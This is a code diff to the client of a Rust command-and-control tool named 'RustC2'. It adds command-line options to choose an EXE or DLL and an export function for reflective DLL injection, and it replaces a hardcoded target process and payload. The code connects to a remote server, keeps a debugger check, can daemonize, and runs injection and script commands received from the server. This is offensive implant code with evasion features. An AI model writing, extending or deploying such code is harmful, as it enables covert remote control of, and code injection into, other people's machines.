@@ -37,8 +37,10 @@ fn main() {
     #[cfg(windows)]
     sandbox::check_debugger();
 
-    let mut host = "192.168.183.1".to_string();
+    let mut host = "127.0.0.1".to_string();
     let mut port = "8080".to_string();
+    let mut injected = String::from("");
+    let mut export = String::from("");
     let mut imported_scripts: HashMap<String, ImportedScript> = HashMap::new();
 
     let matches = Command::new("RustC2")
@@ -47,6 +49,8 @@ fn main() {
         .arg(arg!(-H --host [IpAddr] "The host ip of the server (default 127.0.0.1)"))
         .arg(arg!(-p --port [PORT] "The port number used by the server (default 8080)"))
         .arg(arg!(-d --daemonize "Daemonize the client"))
+        .arg(arg!(-e --pe [ExeDLL] "The Exe or dll to inject"))
+        .arg(arg!(-f --ex [Func] "Insert export function DLL"))
         .get_matches();
 
     if let Some(h) = matches.get_one::<String>("host") {
@@ -59,6 +63,14 @@ fn main() {
     if matches.get_flag("daemonize") {
         #[cfg(unix)]
         daemonize_process();
+    }
+
+    if let Some(pe) = matches.get_one::<String>("pe") {
+        injected = pe.to_string();
+    }
+
+    if let Some(ex) = matches.get_one::<String>("ex") {
+        export = ex.to_string();
     }
 
     let username = std::env::var("USERNAME").expect("username variable not set");
@@ -123,12 +135,7 @@ fn main() {
                         utils::handle_run_script(&mut stream, &command, &imported_scripts, shared_secret);
                     } else if command.starts_with("||RDLL||") 
                     {
-                        #[cfg(windows)]
-                        let target_pid = 6372;
-                        #[cfg(windows)]
-                        let dll_bytes: &[u8] = include_bytes!("test.exe");
-                        #[cfg(windows)]
-                        rdll::reflective_inject(&mut stream, target_pid, dll_bytes, shared_secret);
+                        rdll::reflective_inject(&mut stream, injected.clone(), export.clone(), shared_secret);
                     } else if command_clone.starts_with("||EXIT||") {
                         exit(1);
                     } else {
